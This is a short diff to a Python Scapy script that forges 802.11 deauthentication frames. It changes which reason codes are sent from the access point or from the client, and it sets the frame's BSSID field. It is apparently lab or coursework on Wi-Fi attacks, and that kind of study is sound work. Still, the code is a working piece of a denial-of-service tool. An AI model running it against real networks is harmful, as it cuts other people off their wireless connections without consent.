@@ -26,19 +26,16 @@ sender = ""
 receiver = ""
 
 # Reason type 4 is when the client is inactive, type 5 is when the AP is unable to serve client at the moment (too busy), so these message must be send by an AP.
-if(arguments.reason == 4 or arguments.reason == 5):
+if(arguments.reason == 1 or arguments.reason == 4 or arguments.reason == 5):
     sender = arguments.s
     receiver = arguments.c
 # Reason type 8 is when a client is 
-elif(arguments.reason == 8):
+else:
     sender = arguments.c
     receiver = arguments.s
-else:
-    sender = arguments.s
-    receiver = arguments.c
 
 # Dot11 -> type 0 is a management frame (deauth packet are management frame), subtype 12 is the subtype for the deauth management frame.
-deauthPacket = RadioTap() / Dot11(type=0, subtype=12, addr1=receiver,addr2=sender, addr3=sender) / Dot11Deauth(reason=arguments.reason)
+deauthPacket = RadioTap() / Dot11(type=0, subtype=12, addr1=receiver, addr2=sender, addr3=arguments.s) / Dot11Deauth(reason=arguments.reason)
 
 print("Sending deauth packet...")
 
